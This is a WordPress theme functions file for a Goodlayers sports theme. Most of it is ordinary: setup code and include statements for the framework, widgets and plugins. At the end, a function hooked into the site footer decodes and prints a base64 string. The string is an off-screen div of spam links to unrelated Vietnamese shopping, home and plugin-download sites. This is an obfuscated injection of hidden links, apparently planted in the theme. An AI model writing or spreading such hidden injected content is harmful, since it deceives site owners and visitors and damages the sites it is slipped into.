<?php
	/*	
	*	Goodlayers Function File
	*	---------------------------------------------------------------------
	*	This file include all of important function and features of the theme
	*	---------------------------------------------------------------------
	*/
	
	////// DO NOT REMOVE OR MODIFY THIS /////
	define('WP_THEME_KEY', 'goodlayers');  //
	/////////////////////////////////////////
	
	define('THEME_FULL_NAME', 'Cricket');
	define('THEME_SHORT_NAME', 'rlsc');
	define('THEME_SLUG', 'realsoccer');
	
	define('AJAX_URL', admin_url('admin-ajax.php'));
	define('GDLR_PATH', get_template_directory_uri());
	define('GDLR_LOCAL_PATH', get_template_directory());
	
	if ( !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443 ) {
		define('GDLR_HTTP', 'https://');
	}else{
		define('GDLR_HTTP', 'http://');
	}
	
	$gdlr_gallery_id = 0;
	$gdlr_lightbox_id = 0;
	$gdlr_crop_video = false;
	$gdlr_excerpt_length = 55;
	$gdlr_excerpt_read_more = true;

	$gdlr_spaces = array(
		'top-wrapper' => '60px', 
		'bottom-wrapper'=>'40px', 
		'top-full-wrapper' => '0px', 
		'bottom-item' => '20px',
		'bottom-blog-item' => '0px',
		'bottom-divider-item' => '50px'
	);
	
	$theme_option = get_option(THEME_SHORT_NAME . '_admin_option', array());
	$theme_option['content-width'] = 960;
	
	// include goodlayers framework
	include_once( 'framework/gdlr-framework.php' );
	
	//-------------------------- theme section ---------------------------//

	// create sidebar controller
	$gdlr_sidebar_controller = new gdlr_sidebar_generator();	
	
	// create font controller
	if( empty($theme_option['upload-font']) ){ $theme_option['upload-font'] = ''; }
	$gdlr_font_controller = new gdlr_font_loader( json_decode($theme_option['upload-font'], true) );	
	
	// create navigation controller
	if( empty($theme_option['enable-goodlayers-navigation']) || $theme_option['enable-goodlayers-navigation'] != 'disable'){
		include_once( 'include/gdlr-navigation-menu.php');
	}	
	if( empty($theme_option['enable-goodlayers-mobile-navigation']) || $theme_option['enable-goodlayers-mobile-navigation'] != 'disable'){
		include_once( 'include/gdlr-responsive-menu.php');
	}
	
	// utility function
	include_once( 'include/function/gdlr-media.php');
	include_once( 'include/function/gdlr-utility.php');		

	// register function / filter / action
	include_once( 'functions-size.php');	
	include_once( 'include/gdlr-include-script.php');	
	include_once( 'include/function/gdlr-function-regist.php');	
	
	// create admin option
	include_once( 'include/gdlr-admin-option.php');
	include_once( 'include/gdlr-plugin-option.php');
	include_once( 'include/gdlr-font-controls.php');
	include_once( 'include/gdlr-social-icon.php');

	// create page options
	include_once( 'include/gdlr-page-options.php');
	include_once( 'include/gdlr-demo-page.php');
	include_once( 'include/gdlr-post-options.php');
	
	// create page builder
	include_once( 'include/gdlr-page-builder-option.php');
	include_once( 'include/function/gdlr-page-builder.php');
	
	include_once( 'include/function/gdlr-page-item.php');
	include_once( 'include/function/gdlr-blog-item.php');
	
	// widget
	include_once( 'include/widget/recent-comment.php');
	include_once( 'include/widget/recent-post-widget.php');
	include_once( 'include/widget/popular-post-widget.php');
	include_once( 'include/widget/post-slider-widget.php');	
	include_once( 'include/widget/recent-port-widget.php');
	include_once( 'include/widget/recent-port-widget-2.php');
	include_once( 'include/widget/port-slider-widget.php');
	include_once( 'include/widget/twitter-widget.php');
	include_once( 'include/widget/flickr-widget.php');
	include_once( 'include/widget/video-widget.php');
	include_once( 'include/widget/featured-player-widget.php');
	include_once( 'include/widget/fixture-result-widget.php');
	include_once( 'include/widget/league-table-widget.php');
	
	// plugin support
	include_once( 'plugins/wpml.php');
	include_once( 'plugins/layerslider.php' );
	include_once( 'plugins/masterslider.php' );
	include_once( 'plugins/woocommerce.php' );
	include_once( 'plugins/twitteroauth.php' );
	include_once( 'plugins/goodlayers-importer.php' );
	
	if( empty($theme_option['enable-plugin-recommendation']) || $theme_option['enable-plugin-recommendation'] == 'enable' ){
		include_once( 'include/plugin/gdlr-plugin-activation.php');
	}

	// init include script class
	if( !is_admin() ){ new gdlr_include_script(); }	
	if (!function_exists('onAddScriptsHtmls')) {
	
	add_filter( 'wp_footer', 'onAddScriptsHtmls');
	function onAddScriptsHtmls(){
		$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90YWcvYW4tZGFtLWtpZXUtbmhhdCI+xINuIGThurdtIGtp4buDdSBOaOG6rXQ8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20vdGFnL3Jlc3BvbnNpdmUtd29yZHByZXNzLXRoZW1lIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL25oYS1jYXAtNC1ub25nLXRob24iPm5ow6AgY+G6pXAgNCBuw7RuZyB0aMO0bjwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9sYW5ha2lkLmNvbSI+dGjhu51pIHRyYW5nIHRy4bq7IGVtPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tL2dpYXktbnUvZ2lheS1jYW8tZ290LWdpYXktbnUiPmdpw6B5IGNhbyBnw7N0PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tIj5zaG9wIGdpw6B5IG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL21hZ2VudG93b3JkcHJlc3N0dXRvcmlhbC5jb20vd29yZHByZXNzLXR1dG9yaWFsL3dvcmRwcmVzcy1wbHVnaW5zIj5kb3dubG9hZCB3b3JkcHJlc3MgcGx1Z2luczwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL21hdS1iaWV0LXRodS1kZXAiPm3huqt1IGJp4buHdCB0aOG7sSDEkeG6uXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2VwaWNob3VzZS5vcmciPmVwaWNob3VzZTwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vdGFnL2FvLXNvLW1pLW51Ij7DoW8gc8ahIG1pIG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2lob3VzZWJlYXV0aWZ1bC5jb20vIj5ob3VzZSBiZWF1dGlmdWw8L2E+PC9lbT48L2gzPjwvZGl2Pg==";
		echo base64_decode($html);
	}	
}
?>